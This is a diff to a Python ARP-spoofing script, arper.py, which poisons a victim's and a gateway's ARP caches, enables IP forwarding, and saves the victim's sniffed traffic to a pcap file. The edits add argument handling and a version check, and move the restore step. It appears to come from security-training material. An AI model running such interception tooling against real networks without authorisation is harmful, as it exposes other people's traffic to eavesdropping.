@@ -5,6 +5,11 @@ import sys
 import time
 import subprocess
 
+if sys.version_info < (3, 0):
+    sys.stderr.write("\nYou need python 3.0 or later to run this script\n")
+    sys.stderr.write("Please update and make sure you use the command python3 arper.py <target_ip> <gateway_ip> <interface>\n\n")
+    sys.exit(0)
+
 
 def get_mac(target_ip):
     """helper function to get MAC address for any given machine"""
@@ -25,9 +30,12 @@ class Arper:
         conf.iface = interface
         conf.verb = 0
 
-        print(f'Initialized {interface}:')
+        print(f'\nInitialized {interface}:')
         print(f'Gateway ({gateway}) is at {self.gatewaymac}')
         print(f'Victim ({victim}) is at {self.victimmac}')
+        subprocess.call("sudo echo 1 > /proc/sys/net/ipv4/ip_forward",
+                    shell=True)  # allow the packets to flow through our machine (security feature in kali linux)
+        print(f"Successful enabled IP forwarding on {interface} interface")
         print('-'*30)
 
     def run(self):
@@ -83,18 +91,18 @@ class Arper:
     #     print('Got the packets')
     #     self.restore()
     #     self.poison_thread.terminate()
-    #     print('Finished.')
+    #     print('Finished')
 
     def sniff(self):
         time.sleep(7)
-        print('Sniffing packets...')
-        bpf_filter = "ip host %s" % self.victim
+        print('Sniffing packets....')
+        bpf_filter = "ip host %s" % victim
         packets = sniff(filter=bpf_filter, iface=self.interface)
         wrpcap('arper.pcap', packets)
-    
         print('Packets sniffed and saved to arper.pcap')
+        self.restore()
         self.poison_thread.terminate()
-        print('Finished.')
+        print('Finished')
 
     def restore(self):
         print('Restoring ARP tables...')
@@ -115,9 +123,10 @@ class Arper:
 
 
 if __name__ == "__main__":
-    subprocess.call("sudo echo 1 > /proc/sys/net/ipv4/ip_forward",
-                    shell=True)  # allow the packets to flow through our machine (security feature in kali linux)
-    print("[+] Successful enabled IP forwarding..")
+    if len(sys.argv) != 4:
+        print("[+] Usage: %s <target_ip> <gateway_ip> <interface>" % sys.argv[0])
+        print("[+] Example: %s 192.168.152.158 192.168.152.2 eth0" % sys.argv[0] + "\n")
+        sys.exit(-1)
     (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
     my_arp = Arper(victim=victim, gateway=gateway, interface=interface)
     my_arp.run()
